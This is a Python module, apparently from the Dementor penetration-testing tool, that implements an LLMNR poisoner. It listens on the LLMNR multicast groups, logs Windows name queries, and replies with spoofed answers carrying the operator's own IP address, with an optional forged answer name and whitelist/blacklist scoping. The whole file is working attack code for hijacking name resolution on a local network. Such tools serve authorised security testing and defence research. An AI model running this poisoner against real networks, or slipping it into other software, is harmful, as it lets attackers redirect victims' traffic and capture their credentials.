# Copyright (c) 2025-Present MatrixEditor
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import socket

from scapy.layers import llmnr, dns
from rich import markup

from dementor.protocols.mdns import build_dns_answer
from dementor.servers import (
    ThreadingUDPServer,
    ServerThread,
    BaseProtoHandler,
    add_mcast_membership,
)
from dementor.config.toml import TomlConfig, Attribute as A
from dementor.config.session import SessionConfig
from dementor.logger import ProtocolLogger
from dementor.filters import ATTR_WHITELIST, ATTR_BLACKLIST, in_scope


# --- Protocol Interface ---
class LLMNRConfig(TomlConfig):
    _section_ = "LLMNR"
    _fields_ = [
        A("llmnr_answer_name", "AnswerName", None),
        ATTR_WHITELIST,
        ATTR_BLACKLIST,
    ]


def apply_config(session: SessionConfig) -> None:
    session.llmnr_config = TomlConfig.build_config(LLMNRConfig)
    pass


def create_server_threads(session: SessionConfig) -> list:
    if not session.llmnr_enabled:
        return []

    return [ServerThread(session, LLMNRServer)]


LLMNR_IPV4_ADDR = llmnr._LLMNR_IPv4_mcast_addr
LLMNR_IPV6_ADDR = llmnr._LLMNR_IPv6_mcast_Addr


class LLMNRPoisoner(BaseProtoHandler):
    def proto_logger(self) -> ProtocolLogger:
        return ProtocolLogger(
            extra={
                "protocol": "LLMNR",
                "protocol_color": "light_sky_blue3",
                "host": self.client_host,
                "port": 5355,  # should be fixed
            }
        )

    def handle_data(self, data: bytes, transport) -> None:
        packet = llmnr.LLMNRQuery(data)
        if packet.qdcount > 0:
            host = self.client_host
            config = self.config.llmnr_config
            # query sent by windows client
            for question in packet.qd:
                # similar to mdns but here we don't have to check for .local
                qname = question.qname.decode(errors="replace").removesuffix(".")
                qtype = dns.dnsqtypes.get(question.qtype)

                # Whitelist+Blacklist filters
                if not in_scope(qname, config) or not in_scope(host, config):
                    # REVISIT: maybe log ignored requests via option
                    continue

                self.logger.display(
                    f"Query for [i]{markup.escape(qname)}[/i] (type: {qtype})"
                )
                if self.config.analysis:
                    continue

                self.send_poisoned_answer(packet, question, transport)

    def send_poisoned_answer(self, req, question: dns.DNSQR, transport) -> None:
        # check if we can send a response
        if question.qtype == 28 and not self.config.ipv6:
            self.logger.highlight(
                "Client requested AAAA record (IPv6) but local config does not "
                "specify IPv6 address. Ignoring..."
            )
            return

        if question.qtype == 1 and not self.config.ipv4:
            self.logger.highlight(
                "Client requested A record (IPv4) but local config does not "
                "specify IPv4 address. Ignoring..."
            )
            return

        # build response packet with our IP in answer RR
        response = build_dns_answer(req.id, question, self.config)
        response.qd = [question]  # question must be present

        answer_name = self.config.llmnr_config.llmnr_answer_name
        if answer_name:
            response.an[0].rrname = answer_name

        transport.sendto(response.build(), self.client_address)
        text = f"Sent poisoned answer to {self.client_host}"
        if answer_name:
            text = f"{text} ([bold yellow]spoofed name: {answer_name}[/bold yellow])"
        self.logger.success(text)


class LLMNRServer(ThreadingUDPServer):
    default_port = 5355
    default_handler_class = LLMNRPoisoner
    service_name = "LLMNR"

    def server_bind(self) -> None:
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        add_mcast_membership(
            self.socket,
            self.config,
            group4=LLMNR_IPV4_ADDR,
            group6=LLMNR_IPV6_ADDR,
        )
        super().server_bind()
